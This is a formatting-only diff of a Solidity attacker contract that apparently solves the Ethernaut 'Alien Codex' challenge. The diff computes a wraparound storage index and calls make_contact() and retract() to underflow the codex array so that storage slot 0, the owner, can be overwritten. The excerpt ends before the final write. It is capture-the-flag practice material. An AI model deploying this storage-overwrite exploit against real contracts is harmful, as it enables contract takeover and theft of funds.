@@ -8,22 +8,15 @@ contract AlienCodexAttacker {
         codex_alien = _codex_alien;
     }
 
-    function get_signature(
-        string memory _signature
-    ) public pure returns (bytes4) {
+    function get_signature(string memory _signature) public pure returns (bytes4) {
         return bytes4(keccak256(bytes(_signature)));
     }
 
-    function pad_address_to_bytes_32(
-        address _address
-    ) public pure returns (bytes32) {
+    function pad_address_to_bytes_32(address _address) public pure returns (bytes32) {
         return bytes32(uint256(uint160(_address)));
     }
 
-    function get_index(
-        uint256 slot,
-        uint256 index
-    ) public pure returns (uint256) {
+    function get_index(uint256 slot, uint256 index) public pure returns (uint256) {
         return uint256(keccak256(abi.encodePacked(slot))) + (index);
     }
 
@@ -32,27 +25,18 @@ contract AlienCodexAttacker {
     // https://docs.alchemy.com/docs/smart-contract-storage-layout
     // https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow
     function get_attack_index() public pure returns (uint256) {
-        return
-            uint256(
-                0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
-            ) -
-            get_index(1, 0) +
-            1;
+        return uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) - get_index(1, 0) + 1;
     }
 
     function attack() public returns (bool) {
         // call make_contact()
-        (bool contactSuccess, ) = codex_alien.call(
-            abi.encodePacked(get_signature("make_contact()"))
-        );
+        (bool contactSuccess, ) = codex_alien.call(abi.encodePacked(get_signature("make_contact()")));
         if (!contactSuccess) {
             revert("Error while making contact");
         }
 
         // call retract()
-        (bool retractSuccess, ) = codex_alien.call(
-            abi.encodePacked(get_signature("retract()"))
-        );
+        (bool retractSuccess, ) = codex_alien.call(abi.encodePacked(get_signature("retract()")));
         if (!retractSuccess) {
             revert("Error while retracting");
         }
